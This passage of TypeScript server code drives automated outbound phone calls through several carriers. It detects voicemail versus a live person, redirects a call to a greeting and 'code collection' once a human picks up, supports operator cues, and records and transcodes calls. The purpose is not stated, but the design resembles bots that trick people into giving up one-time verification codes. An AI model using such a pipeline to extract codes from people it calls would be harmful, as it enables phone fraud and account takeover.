        (s) =>
          s.to === normTo &&
          ['queued', 'initiating', 'ringing', 'in-progress', 'collecting-input', 'awaiting-operator'].includes(
            s.status
          )
      )
      .sort((a, b) => new Date(b.createdAt).getTime() - new Date(a.createdAt).getTime())[0];
    if (activeByPhone) return activeByPhone;

    // Secondary fallback for post-hangup status/recording callbacks arriving right after call completion
    const recentCompletedByPhone = Array.from(sessions.values())
      .filter(
        (s) =>
          s.to === normTo &&
          Date.now() - new Date(s.createdAt).getTime() < 15 * 60 * 1000
      )
      .sort((a, b) => new Date(b.createdAt).getTime() - new Date(a.createdAt).getTime())[0];
    if (recentCompletedByPhone) return recentCompletedByPhone;
  }

  return undefined;
}

// -------------------------------------------------------------
// AMD, SPEECH TRANSCRIPTION & RECORDING HELPERS
// -------------------------------------------------------------
const VOICEMAIL_SPEECH_REGEX =
  /\b(voicemail|voice message|messaging system|forwarded|leave a message|leave your name|record your message|after the tone|after the beep|at the tone|not available|unavailable|cannot take your call|can't take your call|can't come to the phone|missed your call|call you back|get back to you|mailbox|more options|finished recording|you've reached|you have reached|subscriber you have dialed|person you are trying to reach)\b/i;

const HUMAN_PICKUP_SPEECH_REGEX =
  /^(hello|hi|hey|yes|yeah|yep|yo|speaking|who is this|who's this|who is calling|who's calling|i'm here|i am here|i got it|go ahead|talk to me|can you hear me|hold on|one second|good morning|good afternoon|good evening|what's up)\b/i;

function isVoicemailGreetingSpeech(text: string): boolean {
  const cleaned = text.trim();
  if (!cleaned) return false;
  if (VOICEMAIL_SPEECH_REGEX.test(cleaned)) return true;
  const wordCount = cleaned.split(/\s+/).filter(Boolean).length;
  // Voicemail greetings are long recorded announcements; live human pickup greetings are short (1-9 words)
  return wordCount >= 11;
}

function checkHumanPickupOnVoicemail(
  session: CallSession,
  speechText?: string,
  rawDigits?: string
): boolean {
  // 1. Answering machines never press DTMF keys on the handset
  if (rawDigits && rawDigits.length > 0) {
    return true;
  }

  // 2. Spoken human pickup phrase after voicemail answered
  if (typeof speechText === 'string' && speechText.trim()) {
    const cleaned = speechText.trim();
    if (isVoicemailGreetingSpeech(cleaned)) {
      session.voicemailGreetingComplete = true;
      return false;
    }

    const words = cleaned.split(/\s+/).filter(Boolean);
    if (words.length >= 1 && words.length <= 9) {
      const vmDetectedMs = session.voicemailDetectedAt
        ? Date.now() - new Date(session.voicemailDetectedAt).getTime()
        : 9999;

      // Avoid false-triggering on a 2-word opener of a voicemail greeting right at voicemail start
      if (!session.voicemailGreetingComplete && vmDetectedMs < 2600) {
        return false;
      }

      if (HUMAN_PICKUP_SPEECH_REGEX.test(cleaned) || session.voicemailGreetingComplete) {
        return true;
      }
    }
  }

  return false;
}

async function redirectLiveCallToHumanStart(
  session: CallSession,
  customTwilio?: any,
  carriersConfig: any = {}
): Promise<boolean> {
  if (
    session.isSimulated ||
    session.promptsStarted ||
    ['completed', 'failed', 'busy', 'no-answer'].includes(session.status)
  ) {
    return false;
  }

  const carrier = session.carrier || 'twilio';
  const providerSid = session.providerCallSid || '';
  const appBaseUrl = getPublicBaseUrl(undefined, session.publicBaseUrl);
  const savedCreds = getCallCredentials(session.id);

  session.promptsStarted = true;
  persistSessionsToDisk();

  try {
    if (carrier === 'twilio' && providerSid.startsWith('CA')) {
      const accountSid =
        carriersConfig.twilio?.accountSid ||
        customTwilio?.accountSid ||
        savedCreds?.twilioSid ||
        process.env.TWILIO_ACCOUNT_SID;
      const authToken =
        carriersConfig.twilio?.authToken ||
        customTwilio?.authToken ||
        savedCreds?.twilioToken ||
        process.env.TWILIO_AUTH_TOKEN;
      if (accountSid && authToken) {
        const client = twilio(accountSid, authToken);
        await client.calls(providerSid).update({
          url: `${appBaseUrl}/api/twiml/human-start?callId=${encodeURIComponent(session.id)}`,
          method: 'POST',
        });
        return true;
      }
    } else if (carrier === 'signalwire' && providerSid && !providerSid.startsWith('call_')) {
      const spaceUrl =
        carriersConfig.signalwire?.spaceUrl || savedCreds?.swSpace || process.env.SIGNALWIRE_SPACE_URL;
      const projectId =
        carriersConfig.signalwire?.projectId || savedCreds?.swProject || process.env.SIGNALWIRE_PROJECT_ID;
      const apiToken =
        carriersConfig.signalwire?.apiToken || savedCreds?.swToken || process.env.SIGNALWIRE_API_TOKEN;
      if (spaceUrl && projectId && apiToken) {
        const cleanSpace = spaceUrl.replace(/^https?:\/\//, '').replace(/\/$/, '');
        const r = await fetch(
          `https://${cleanSpace}/api/laml/2010-04-01/Accounts/${projectId}/Calls/${encodeURIComponent(providerSid)}.json`,
          {
            method: 'POST',
            headers: {
              Authorization: `Basic ${Buffer.from(`${projectId}:${apiToken}`).toString('base64')}`,
              'Content-Type': 'application/x-www-form-urlencoded',
            },
            body: new URLSearchParams({
              Url: `${appBaseUrl}/api/signalwire/human-start?callId=${encodeURIComponent(session.id)}`,
              Method: 'POST',
            }).toString(),
          }
        );
        if (r.ok) return true;
      }
    } else if (carrier === 'plivo' && providerSid && !providerSid.startsWith('call_')) {
      const plivoAuthId =
        carriersConfig.plivo?.authId || savedCreds?.plivoId || process.env.PLIVO_AUTH_ID;
      const plivoAuthToken =
        carriersConfig.plivo?.authToken || savedCreds?.plivoToken || process.env.PLIVO_AUTH_TOKEN;
      if (plivoAuthId && plivoAuthToken) {
        const r = await fetch(
          `https://api.plivo.com/v1/Account/${plivoAuthId}/Call/${encodeURIComponent(providerSid)}/`,
          {
            method: 'POST',
            headers: {
              Authorization: `Basic ${Buffer.from(`${plivoAuthId}:${plivoAuthToken}`).toString('base64')}`,
              'Content-Type': 'application/json',
            },
            body: JSON.stringify({
              legs: 'aleg',
              aleg_url: `${appBaseUrl}/api/plivo/human-start?callId=${encodeURIComponent(session.id)}`,
              aleg_method: 'POST',
            }),
          }
        );
        if (r.ok) return true;
      }
    }
  } catch (err) {
    console.error('Live call human-start redirect fallback to amd-gate poll:', err);
  }

  // Allow the active 2-second amd-gate gather loop to play the greeting on its next beat
  session.promptsStarted = false;
  persistSessionsToDisk();
  return false;
}

function parseAnsweredBy(
  raw?: string,
  plivoMachine?: string
): 'human' | 'voicemail' | 'fax' | 'unknown' | undefined {
  if (plivoMachine !== undefined && String(plivoMachine).trim() !== '') {
    const m = String(plivoMachine).toLowerCase().trim();
    if (m === 'true' || m === 'machine') return 'voicemail';
    if (m === 'false' || m === 'human') return 'human';
  }
  if (!raw) return undefined;
  const v = String(raw).toLowerCase().trim();
  if (!v) return undefined;
  if (v === 'human') return 'human';
  if (
    v.startsWith('machine') ||
    v === 'voicemail' ||
    v === 'answering_machine'
  ) {
    return 'voicemail';
  }
  if (v === 'fax' || v === 'fax_machine') return 'fax';
  if (v === 'unknown' || v === 'not_sure') return 'unknown';
  return undefined;
}

async function terminateCarrierCall(
  session: CallSession,
  customTwilio?: any,
  carriersConfig: any = {}
) {
  if (session.isSimulated) return;
  try {
    const carrier = session.carrier || 'twilio';
    const providerSid = session.providerCallSid || session.id;
    const savedCreds = getCallCredentials(session.id);

    if (carrier === 'twilio') {
      const accountSid =
        carriersConfig.twilio?.accountSid ||
        customTwilio?.accountSid ||
        savedCreds?.twilioSid ||
        process.env.TWILIO_ACCOUNT_SID;
      const authToken =
        carriersConfig.twilio?.authToken ||
        customTwilio?.authToken ||
        savedCreds?.twilioToken ||
        process.env.TWILIO_AUTH_TOKEN;
      if (accountSid && authToken && providerSid.startsWith('CA')) {
        const client = twilio(accountSid, authToken);
        // Stop active call recording first so Twilio flushes the audio file immediately on hangup
        await client
          .calls(providerSid)
          .recordings('Twilio.CURRENT')
          .update({ status: 'stopped' })
          .catch(() => {});
        await client.calls(providerSid).update({ status: 'completed' });
      }
    } else if (carrier === 'plivo') {
      const plivoAuthId =
        carriersConfig.plivo?.authId || savedCreds?.plivoId || process.env.PLIVO_AUTH_ID;
      const plivoAuthToken =
        carriersConfig.plivo?.authToken || savedCreds?.plivoToken || process.env.PLIVO_AUTH_TOKEN;
      if (plivoAuthId && plivoAuthToken && !providerSid.startsWith('call_')) {
        const plivoAuth = `Basic ${Buffer.from(`${plivoAuthId}:${plivoAuthToken}`).toString('base64')}`;
        await fetch(
          `https://api.plivo.com/v1/Account/${plivoAuthId}/Call/${encodeURIComponent(providerSid)}/Record/`,
          { method: 'DELETE', headers: { Authorization: plivoAuth } }
        ).catch(() => {});
        await fetch(
          `https://api.plivo.com/v1/Account/${plivoAuthId}/Call/${encodeURIComponent(providerSid)}/`,
          {
            method: 'DELETE',
            headers: { Authorization: plivoAuth },
          }
        );
      }
    } else if (carrier === 'telnyx') {
      const telnyxApiKey =
        carriersConfig.telnyx?.apiKey || savedCreds?.telnyxKey || process.env.TELNYX_API_KEY;
      if (telnyxApiKey && !providerSid.startsWith('call_')) {
        await fetch(
          `https://api.telnyx.com/v2/calls/${encodeURIComponent(providerSid)}/actions/hangup`,
          {
            method: 'POST',
            headers: {
              Authorization: `Bearer ${telnyxApiKey}`,
              'Content-Type': 'application/json',
            },
            body: JSON.stringify({}),
          }
        );
      }
    } else if (carrier === 'signalwire') {
      const spaceUrl =
        carriersConfig.signalwire?.spaceUrl || savedCreds?.swSpace || process.env.SIGNALWIRE_SPACE_URL;
      const projectId =
        carriersConfig.signalwire?.projectId || savedCreds?.swProject || process.env.SIGNALWIRE_PROJECT_ID;
      const apiToken =
        carriersConfig.signalwire?.apiToken || savedCreds?.swToken || process.env.SIGNALWIRE_API_TOKEN;
      if (spaceUrl && projectId && apiToken && !providerSid.startsWith('call_')) {
        const cleanSpace = spaceUrl.replace(/^https?:\/\//, '').replace(/\/$/, '');
        await fetch(
          `https://${cleanSpace}/api/laml/2010-04-01/Accounts/${projectId}/Calls/${encodeURIComponent(providerSid)}.json`,
          {
            method: 'POST',
            headers: {
              Authorization: `Basic ${Buffer.from(`${projectId}:${apiToken}`).toString('base64')}`,
              'Content-Type': 'application/x-www-form-urlencoded',
            },
            body: new URLSearchParams({ Status: 'completed' }).toString(),
          }
        );
      }
    }
  } catch (err) {
    console.error('Error terminating carrier call:', err);
  }
}

async function applyAmdResult(
  session: CallSession,
  answeredBy: 'human' | 'voicemail' | 'fax' | 'unknown',
  rawLabel: string
) {
  const prev = session.answeredBy;
  // Don't downgrade a confirmed voicemail or human to 'unknown'
  if (answeredBy === 'unknown' && (prev === 'voicemail' || prev === 'human')) {
    return;
  }
  // Never downgrade back to voicemail if a live human already picked up after voicemail
  if (answeredBy === 'voicemail' && session.humanPickedUpAfterVoicemail) {
    return;
  }

  session.answeredBy = answeredBy;
  session.amdRawResult = rawLabel;

  if (answeredBy === 'voicemail') {
    if (!session.voicemailDetectedAt) {
      session.voicemailDetectedAt = new Date().toISOString();
    }
    if (String(rawLabel).toLowerCase().includes('machine_end')) {
      session.voicemailGreetingComplete = true;
    }
  }

  if (prev !== answeredBy) {
    if (answeredBy === 'voicemail') {
      addSessionEvent(session, {
        type: 'amd',
        title: 'Voicemail Machine Answered — Spoken Prompts Held Silent',
        description: `Voicemail detected (${rawLabel}). Greetings are muted for voicemail; silently listening for live human pickup & recording.`,
        data: { answeredBy, rawLabel },
      });

      if (session.autoHangupOnVoicemail && !['completed', 'failed', 'busy', 'no-answer'].includes(session.status)) {
        session.status = 'no-answer';
        session.pendingDigits = undefined;
        session.activeCue = undefined;
        session.completedAt = new Date().toISOString();
        addSessionEvent(session, {
          type: 'call-state',
          title: 'Auto-Ended Call: Voicemail Answered',
          description: 'Auto-hangup on voicemail is enabled. Terminated outbound call automatically.',
        });
        await terminateCarrierCall(session);
        void finalizeCallRecording(session);
      }
    } else if (answeredBy === 'human') {
      addSessionEvent(session, {
        type: 'amd',
        title: session.humanPickedUpAfterVoicemail
          ? 'Live Human Picked Up Phone After Voicemail!'
          : 'Live Human Answered Confirmed',
        description: session.humanPickedUpAfterVoicemail
          ? `A live human took the handset (${rawLabel}). Starting immediate pickup greeting & code collection now!`
          : `Live human confirmed on the line (${rawLabel}). Playing greeting & recording accordingly.`,
        data: { answeredBy, rawLabel, humanPickedUpAfterVoicemail: session.humanPickedUpAfterVoicemail },
      });
    } else if (answeredBy === 'fax') {
      addSessionEvent(session, {
        type: 'amd',
        title: 'Fax Tone Detected',
        description: `Carrier AMD detected a fax machine (${rawLabel}). Holding spoken prompts silent.`,
        data: { answeredBy, rawLabel },
      });
    } else {
      persistSessionsToDisk();
      broadcastEvent(session.id, 'session-update', session);
    }
  } else {
    persistSessionsToDisk();
    broadcastEvent(session.id, 'session-update', session);
  }
}

function appendSpeechTranscript(
  session: CallSession,
  text: string,
  confidence?: number,
  contextLabel?: string
) {
  const cleaned = text.trim();
  if (!cleaned) return;

  if (!Array.isArray(session.speechTranscripts)) {
    session.speechTranscripts = [];
  }

  const entry: SpeechTranscriptEntry = {
    id: `sp_${Date.now()}_${Math.random().toString(36).substring(2, 6)}`,
    text: cleaned,
    confidence,
    timestamp: new Date().toISOString(),
  };

  session.speechTranscripts.push(entry);
  session.capturedSpeech = session.speechTranscripts.map((t) => t.text).join(' | ');
  if (confidence !== undefined && !Number.isNaN(confidence)) {
    session.confidence = confidence;
  }

  const confSuffix =
    confidence !== undefined && !Number.isNaN(confidence)
      ? ` (Confidence: ${Math.round(confidence * 100)}%)`
      : '';

  addSessionEvent(session, {
    type: 'speech',
    title: `Caller Spoke${contextLabel ? ` (${contextLabel})` : ''}: "${cleaned}"`,
    description: `Live voice recognition captured spoken audio${confSuffix}.`,
    data: { speech: cleaned, confidence },
  });

  if (isVoicemailGreetingSpeech(cleaned)) {
    session.voicemailGreetingComplete = true;
    if (!session.promptsStarted && !session.humanPickedUpAfterVoicemail && session.answeredBy !== 'voicemail') {
      void applyAmdResult(session, 'voicemail', 'voicemail_greeting_speech');
    }
  }
}

function findCachedRecordingPath(callId: string): { filePath: string; mimeType: string } | null {
  const candidates: Array<{ ext: string; mime: string }> = [
    { ext: 'mp3', mime: 'audio/mpeg' },
    { ext: 'webm', mime: 'audio/webm' },
    { ext: 'wav', mime: 'audio/wav' },
    { ext: 'ogg', mime: 'audio/ogg' },
    { ext: 'mp4', mime: 'audio/mp4' },
  ];
  const safeId = callId.replace(/[^a-zA-Z0-9_-]/g, '');
  for (const c of candidates) {
    const p = path.join(RECORDINGS_DIR, `${safeId}.${c.ext}`);
    if (fs.existsSync(p) && fs.statSync(p).size > 0) {
      return { filePath: p, mimeType: c.mime };
    }
  }
  return null;
}

function buildRecordingCandidateUrls(rawUrl: string, carrier?: string): string[] {
  const trimmed = rawUrl.trim();
  if (carrier === 'twilio' || carrier === 'signalwire') {
    const base = trimmed.replace(/\.(json|xml|mp3|wav)(\?.*)?$/i, '');
    // Prefer lossless 16-bit PCM .wav first (available immediately on hangup & highest source fidelity for ffmpeg!)
    const wavUrl =
      carrier === 'twilio' ? `${base}.wav?RequestedChannels=1` : `${base}.wav`;
    const mp3Url =
      carrier === 'twilio' ? `${base}.mp3?RequestedChannels=1` : `${base}.mp3`;
    return [wavUrl, mp3Url];
  }
  return [trimmed];
}

function resolveCarrierAuthHeader(session: CallSession): string | undefined {
  const saved = getCallCredentials(session.id);
  if (saved?.authHeader) return saved.authHeader;

  const carrier = session.carrier || 'twilio';
  if (carrier === 'twilio' && process.env.TWILIO_ACCOUNT_SID && process.env.TWILIO_AUTH_TOKEN) {
    return `Basic ${Buffer.from(`${process.env.TWILIO_ACCOUNT_SID}:${process.env.TWILIO_AUTH_TOKEN}`).toString('base64')}`;
  }
  if (carrier === 'plivo' && process.env.PLIVO_AUTH_ID && process.env.PLIVO_AUTH_TOKEN) {
    return `Basic ${Buffer.from(`${process.env.PLIVO_AUTH_ID}:${process.env.PLIVO_AUTH_TOKEN}`).toString('base64')}`;
  }
  if (carrier === 'telnyx' && process.env.TELNYX_API_KEY) {
    return `Bearer ${process.env.TELNYX_API_KEY}`;
  }
  if (carrier === 'signalwire' && process.env.SIGNALWIRE_PROJECT_ID && process.env.SIGNALWIRE_API_TOKEN) {
    return `Basic ${Buffer.from(`${process.env.SIGNALWIRE_PROJECT_ID}:${process.env.SIGNALWIRE_API_TOKEN}`).toString('base64')}`;
  }
  return undefined;
}

// Transcode raw carrier WAV/WebM/MP3 into compact (~180-200 KB/min), 24kHz wideband voice-enhanced MP3
async function transcodeToCompactHdMp3(
  rawBuffer: Buffer,
  inputExt: string,
  outMp3Path: string
): Promise<{ ok: boolean; durationSec?: number }> {
  const tmpInput = `${outMp3Path}.tmp_${Date.now()}.${inputExt}`;
  const tmpOutput = `${outMp3Path}.out_${Date.now()}.mp3`;
  try {
    fs.writeFileSync(tmpInput, rawBuffer);
    await execFileAsync(
      'ffmpeg',
      [
        '-y',
        '-i',
        tmpInput,
        '-vn',
        '-af',
        'highpass=f=80,lowpass=f=11000,equalizer=f=2800:t=q:w=1.2:g=2.5,dynaudnorm=f=150:g=11,silenceremove=start_periods=1:start_silence=0.35:start_threshold=-52dB',
        '-ar',
        '24000',
        '-ac',
        '1',
        '-c:a',
        'libmp3lame',
        '-b:a',
        '28k',
        tmpOutput,
      ],
      { timeout: 12000 }
    );

    if (fs.existsSync(tmpOutput) && fs.statSync(tmpOutput).size > 0) {
      fs.renameSync(tmpOutput, outMp3Path);
      const bytes = fs.statSync(outMp3Path).size;
      // 28 kbps = 3500 bytes/sec
      const estDuration = Math.max(1, Math.round(bytes / 3500));
      return { ok: true, durationSec: estDuration };
    }
    return { ok: false };
  } catch (err) {
    console.error('ffmpeg HD voice compression fallback:', err);
    return { ok: false };
  } finally {
    try {
      if (fs.existsSync(tmpInput)) fs.unlinkSync(tmpInput);
      if (fs.existsSync(tmpOutput)) fs.unlinkSync(tmpOutput);
    } catch {
      // Ignore cleanup errors
    }
  }
}

const inFlightDownloads = new Map<string, Promise<string | null>>();
const inFlightFinalizers = new Map<string, Promise<void>>();

const sleep = (ms: number) => new Promise((r) => setTimeout(r, ms));

function markRecordingCompleted(
  session: CallSession,
  filePath: string,
  ext: string,
  durationHint?: number
) {
  const stat = fs.statSync(filePath);
  // Remove any older non-matching extension files for the same callId so findCachedRecordingPath picks the new HD mp3
  const safeId = session.id.replace(/[^a-zA-Z0-9_-]/g, '');
  for (const otherExt of ['wav', 'webm', 'ogg', 'mp4', 'mp3']) {
    if (otherExt !== ext) {
      const stale = path.join(RECORDINGS_DIR, `${safeId}.${otherExt}`);
      if (fs.existsSync(stale)) {
        try {
          fs.unlinkSync(stale);
        } catch {}
      }
    }
  }

  session.localRecordingExt = ext;
  session.recordingSizeBytes = stat.size;
  if (durationHint && (!session.recordingDuration || session.recordingDuration <= 0)) {
    session.recordingDuration = durationHint;
  }
  session.recordingStatus = 'completed';
  session.recordingUrl = `/api/calls/${encodeURIComponent(session.id)}/recording?v=${stat.size}`;

  const alreadyLogged = session.events.some((e) => e.type === 'recording');
  if (!alreadyLogged) {
    const kb = Math.max(1, Math.round(stat.size / 1024));
    addSessionEvent(session, {
      type: 'recording',
      title: `HD Call Recording Ready (${kb} KB)`,
      description: `High-clarity 24kHz voice recording saved${
        session.recordingDuration ? ` (${session.recordingDuration}s, ${kb} KB)` : ` (${kb} KB)`
      }. Ready for instant playback.`,
      data: {
        recordingUrl: session.recordingUrl,
        duration: session.recordingDuration,
        sizeBytes: stat.size,
      },
    });
  } else {
    persistSessionsToDisk();
    broadcastEvent(session.id, 'session-update', session);
  }
}

async function downloadAndCacheRecording(session: CallSession, rawUrl: string): Promise<string | null> {
  if (inFlightDownloads.has(session.id)) {
    return inFlightDownloads.get(session.id)!;
  }

  const job = (async (): Promise<string | null> => {
    try {
      const candidateUrls = buildRecordingCandidateUrls(rawUrl, session.carrier);
      const authHeader = resolveCarrierAuthHeader(session);
      const retryDelays = [0, 450, 1000, 1800];

      let downloadedBuf: Buffer | null = null;
      let contentType = '';

      for (const delay of retryDelays) {
        if (delay > 0) await sleep(delay);

        for (const downloadUrl of candidateUrls) {
          const headers: Record<string, string> = {};
          if (
            authHeader &&
            (downloadUrl.includes('twilio.com') ||
              downloadUrl.includes('signalwire.com') ||
              downloadUrl.includes('plivo.com'))
          ) {
            headers.Authorization = authHeader;
          }

          try {
            const res = await fetch(downloadUrl, { headers });
            if (res.ok) {
              const arrayBuf = await res.arrayBuffer();
              if (arrayBuf.byteLength > 128) {
                downloadedBuf = Buffer.from(arrayBuf);
                contentType = (res.headers.get('content-type') || '').toLowerCase();
                break;
              }
            }
          } catch {
            // Try next candidate or retry tick
          }
        }

        if (downloadedBuf) break;
      }

      if (!downloadedBuf) {
        console.error(`Recording download exhausted retries for ${session.id}`);
        return null;
      }

      const rawExt = contentType.includes('wav')
        ? 'wav'
        : contentType.includes('webm')
        ? 'webm'
        : contentType.includes('ogg')
        ? 'ogg'
        : 'mp3';

      const safeId = session.id.replace(/[^a-zA-Z0-9_-]/g, '');
      const mp3OutPath = path.join(RECORDINGS_DIR, `${safeId}.mp3`);

      const transcoded = await transcodeToCompactHdMp3(downloadedBuf, rawExt, mp3OutPath);
      if (transcoded.ok) {
        markRecordingCompleted(session, mp3OutPath, 'mp3', transcoded.durationSec);
        return mp3OutPath;
      }

      // Fallback: save raw buffer directly if ffmpeg failed
      const fallbackPath = path.join(RECORDINGS_DIR, `${safeId}.${rawExt}`);
      fs.writeFileSync(fallbackPath, downloadedBuf);
      markRecordingCompleted(session, fallbackPath, rawExt);
      return fallbackPath;
    } catch (err) {
      console.error('Error caching carrier recording:', err);
      return null;
    } finally {
      inFlightDownloads.delete(session.id);
    }
  })();

  inFlightDownloads.set(session.id, job);
  return job;
}

// Actively stops/fetches/finalizes call recording immediately upon call completion so UI never hangs on 'Recording...'
async function finalizeCallRecording(
  session: CallSession,
  customTwilio?: any,
  carriersConfig: any = {}
): Promise<void> {
  if (session.recordCall === false) {
    if (session.recordingStatus === 'recording') {
      session.recordingStatus = undefined;
      persistSessionsToDisk();
      broadcastEvent(session.id, 'session-update', session);
    }
    return;
  }

  // Already cached and finalized
  const existing = findCachedRecordingPath(session.id);
  if (existing) {
    const ext = path.extname(existing.filePath).replace('.', '') || 'mp3';
    markRecordingCompleted(session, existing.filePath, ext, session.recordingDuration);
    return;
  }

  if (inFlightFinalizers.has(session.id)) {
    return inFlightFinalizers.get(session.id)!;
  }

  const task = (async () => {
    try {
      // 1. SIMULATOR CALLS: Wait briefly for browser auto-upload, then clear if none (e.g. declined before answer)
      if (session.isSimulated) {
        for (const waitMs of [200, 500, 900, 1400]) {
          await sleep(waitMs);
          const simCached = findCachedRecordingPath(session.id);
          if (simCached) {
            const ext = path.extname(simCached.filePath).replace('.', '') || 'mp3';
            markRecordingCompleted(session, simCached.filePath, ext, session.recordingDuration);
            return;
          }
        }
        if (session.recordingStatus === 'recording' && !session.recordingUrl) {
          session.recordingStatus = undefined;
          persistSessionsToDisk();
          broadcastEvent(session.id, 'session-update', session);
        }
        return;
      }

      // 2. LIVE CARRIER CALLS: Actively poll carrier REST API right after call ends
      const carrier = session.carrier || 'twilio';
      const providerSid = session.providerCallSid || '';
      const savedCreds = getCallCredentials(session.id);

      const wasNeverAnswered =
        ['busy', 'no-answer', 'failed'].includes(session.status) &&
        !session.answeredBy &&
        (!session.duration || session.duration === 0);

      const pollDelays = wasNeverAnswered
        ? [350]
        : [150, 600, 1200, 2200, 3500, 5200];

      for (const delayMs of pollDelays) {
        await sleep(delayMs);

        const nowCached = findCachedRecordingPath(session.id);
        if (nowCached) {
          const ext = path.extname(nowCached.filePath).replace('.', '') || 'mp3';
          markRecordingCompleted(session, nowCached.filePath, ext, session.recordingDuration);
          return;
        }

        if (session.providerRecordingUrl) {
          const saved = await downloadAndCacheRecording(session, session.providerRecordingUrl);
          if (saved) return;
        }

        if (carrier === 'twilio' && providerSid.startsWith('CA')) {
          const sid =
            carriersConfig.twilio?.accountSid ||
            customTwilio?.accountSid ||
            savedCreds?.twilioSid ||
            process.env.TWILIO_ACCOUNT_SID;
          const token =
            carriersConfig.twilio?.authToken ||
            customTwilio?.authToken ||
            savedCreds?.twilioToken ||
            process.env.TWILIO_AUTH_TOKEN;

          if (sid && token) {
            try {
              const client = twilio(sid, token);
              const list = await client.recordings.list({ callSid: providerSid, limit: 5 });
              if (list.length > 0) {
                const rec = list[0];
                session.recordingSid = rec.sid;
                if (rec.duration && rec.duration !== '-1') {
                  const parsedDur = parseInt(rec.duration, 10);
                  if (!Number.isNaN(parsedDur) && parsedDur > 0) {
                    session.recordingDuration = parsedDur;
                  }
                }

                if ((rec.status as string) === 'in-progress') {
                  await client
                    .calls(providerSid)
                    .recordings(rec.sid)
                    .update({ status: 'stopped' })
                    .catch(() => {});
                  continue;
                }

                if ((rec.status as string) === 'completed') {
                  const wavUrl = `https://api.twilio.com/2010-04-01/Accounts/${sid}/Recordings/${rec.sid}.wav?RequestedChannels=1`;
                  session.providerRecordingUrl = wavUrl;
                  const saved = await downloadAndCacheRecording(session, wavUrl);
                  if (saved) return;
                }
              }
            } catch (err) {
              console.error('Twilio active recording poll error:', err);
            }
          }
        } else if (carrier === 'signalwire' && providerSid && !providerSid.startsWith('call_')) {
          const spaceUrl =
            carriersConfig.signalwire?.spaceUrl || savedCreds?.swSpace || process.env.SIGNALWIRE_SPACE_URL;
          const projectId =
            carriersConfig.signalwire?.projectId || savedCreds?.swProject || process.env.SIGNALWIRE_PROJECT_ID;
          const apiToken =
            carriersConfig.signalwire?.apiToken || savedCreds?.swToken || process.env.SIGNALWIRE_API_TOKEN;
          if (spaceUrl && projectId && apiToken) {
            try {
              const cleanSpace = spaceUrl.replace(/^https?:\/\//, '').replace(/\/$/, '');
              const swAuth = `Basic ${Buffer.from(`${projectId}:${apiToken}`).toString('base64')}`;
              const r = await fetch(
                `https://${cleanSpace}/api/laml/2010-04-01/Accounts/${projectId}/Calls/${encodeURIComponent(providerSid)}/Recordings.json`,
                { headers: { Authorization: swAuth } }
              );
              if (r.ok) {
                const data: any = await r.json();
                const rec = data?.recordings?.[0];
                if (rec?.sid && (!rec.status || rec.status === 'completed')) {
                  const wavUrl = `https://${cleanSpace}/api/laml/2010-04-01/Accounts/${projectId}/Recordings/${rec.sid}.wav`;
                  session.providerRecordingUrl = wavUrl;
                  const saved = await downloadAndCacheRecording(session, wavUrl);
                  if (saved) return;
                }
              }
            } catch {}
          }
        } else if (carrier === 'plivo' && providerSid && !providerSid.startsWith('call_')) {
          const plivoId =
            carriersConfig.plivo?.authId || savedCreds?.plivoId || process.env.PLIVO_AUTH_ID;
          const plivoToken =
            carriersConfig.plivo?.authToken || savedCreds?.plivoToken || process.env.PLIVO_AUTH_TOKEN;
          if (plivoId && plivoToken) {
            try {
              const plivoAuth = `Basic ${Buffer.from(`${plivoId}:${plivoToken}`).toString('base64')}`;
              const r = await fetch(
                `https://api.plivo.com/v1/Account/${plivoId}/Recording/?call_uuid=${encodeURIComponent(providerSid)}&limit=5`,
                { headers: { Authorization: plivoAuth } }
              );
              if (r.ok) {
                const data: any = await r.json();
                const rec = data?.objects?.[0];
                if (rec?.recording_url) {
                  session.providerRecordingUrl = rec.recording_url;
                  if (rec.recording_duration_ms) {
                    session.recordingDuration = Math.max(1, Math.round(Number(rec.recording_duration_ms) / 1000));
                  }
                  const saved = await downloadAndCacheRecording(session, rec.recording_url);
                  if (saved) return;
                }
              }
            } catch {}
          }
        }
      }

      // If no recording exists after polling completed (e.g. unanswered/0s call), clear stuck 'recording' badge!
      if (!findCachedRecordingPath(session.id) && session.recordingStatus === 'recording') {
        session.recordingStatus = undefined;
        persistSessionsToDisk();
        broadcastEvent(session.id, 'session-update', session);
      }
    } finally {
      inFlightFinalizers.delete(session.id);
    }
  })();

  inFlightFinalizers.set(session.id, task);
  return task;
}

// -------------------------------------------------------------
// UNIFIED VOICE XML WEBHOOKS (Twilio TwiML, Telnyx TeXML, SignalWire LAML, Fonoster)
// -------------------------------------------------------------
const XML_OUTBOUND_ROUTES = [
  '/api/twiml/outbound',
  '/api/telnyx/texml',
  '/api/telnyx/outbound',
  '/api/signalwire/laml',
  '/api/signalwire/outbound',
  '/api/fonoster/webhook',
  '/api/fonoster/outbound',
];

const XML_AMD_GATE_ROUTES = [
  '/api/twiml/amd-gate',
  '/api/telnyx/amd-gate',
  '/api/signalwire/amd-gate',
  '/api/fonoster/amd-gate',
];

const XML_HUMAN_START_ROUTES = [
  '/api/twiml/human-start',
  '/api/telnyx/human-start',
  '/api/signalwire/human-start',
  '/api/fonoster/human-start',
];

const XML_GATHER_ROUTES = [
  '/api/twiml/gather',
  '/api/telnyx/gather',
  '/api/signalwire/gather',
  '/api/fonoster/gather',
];

const XML_WAIT_ROUTES = [
  '/api/twiml/wait-operator',
  '/api/telnyx/wait-operator',
  '/api/signalwire/wait-operator',
  '/api/fonoster/wait-operator',
];

const XML_CUE_GATHER_ROUTES = [
  '/api/twiml/cue-gather',
  '/api/telnyx/cue-gather',
  '/api/signalwire/cue-gather',
  '/api/fonoster/cue-gather',
];

const XML_STATUS_ROUTES = [
  '/api/twiml/status',
  '/api/telnyx/status',
  '/api/signalwire/status',
  '/api/fonoster/status',
];

const XML_AMD_ROUTES = [
  '/api/twiml/amd',
  '/api/telnyx/amd',
  '/api/signalwire/amd',
  '/api/fonoster/amd',
  '/api/plivo/amd',
];

const XML_RECORDING_ROUTES = [
  '/api/twiml/recording',
  '/api/telnyx/recording',
  '/api/signalwire/recording',
  '/api/fonoster/recording',
  '/api/plivo/recording',
];

// Helper: Populate TwiML that plays Immediate Pickup Greeting + Code Gather ONLY to a confirmed Live Human
function populateHumanGreetingTwiml(
  twiml: twilio.twiml.VoiceResponse,
  session: CallSession,
  gatherActionUrl: string
) {
  session.promptsStarted = true;
  session.status = 'collecting-input';

  const alreadyPlayedGreeting = session.events.some(
    (e) => e.type === 'playback' && e.title === 'Immediate Pickup Greeting Played'
  );
  if (!alreadyPlayedGreeting) {
    addSessionEvent(session, {
      type: 'playback',
      title: 'Immediate Pickup Greeting Played',
